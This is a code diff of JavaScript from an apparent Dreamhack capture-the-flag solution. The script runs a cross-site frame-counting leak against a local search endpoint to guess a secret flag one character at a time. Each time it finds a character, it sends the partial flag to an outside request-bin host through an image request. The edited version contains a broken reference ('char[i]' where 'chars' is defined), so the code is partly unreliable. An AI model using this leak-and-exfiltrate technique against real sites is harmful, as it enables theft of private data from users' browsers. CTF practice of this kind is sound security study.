@@ -16,34 +16,26 @@
 
     async function searchChar(data) {
         return new Promise((resolve) => {
-            // 봇의 3초 제한 때문에 응답이 없으면 0.2초 후 다음 글자로 넘김
-            const timer = setTimeout(() => resolve(false), 200);
-
             iframe.onload = () => {
-                clearTimeout(timer);
-                // 블로그의 정답 로직: 하위 프레임 개수 확인
-                const isFound = iframe.contentWindow.frames.length > 0;
-                resolve(isFound);
+                resolve(iframe.contentWindow.frames.length > 0);
             };
-            // 쿼리 전송
             iframe.src = "http://127.0.0.1:8000/search?query=" + encodeURIComponent(data);
-        });
+        })
     }
 
     async function findFlag() {
         // 접속 확인 신호
         new Image().src = "https://qrnfmov.request.dreamhack.games?start=started";
 
-        // 봇의 짧은 생존 시간 동안 최대한 많이 시도
-        for (let i = 0; i < 35; i++) {
+        while (flag.length <= 40) {
             let found = false;
-            for (let c of chars) {
-                if (await searchChar(flag + c)) {
-                    flag += c;
-                    // 찾자마자 즉시 전송
-                    new Image().src = "https://qrnfmov.request.dreamhack.games?flag=" + encodeURIComponent(flag);
+            for (let i = 0; i < chars.length; i++) {
+                if (await searchChar(flag + chars[i])) {
+                    flag += chars[i];
+                    new Image().src = "https://qrnfmov.request.dreamhack.games?found=" + encodeURIComponent(flag);
                     found = true;
-                    if (c === "}") return;
+
+                    if (char[i] === "}") return;
                     break;
                 }
             }
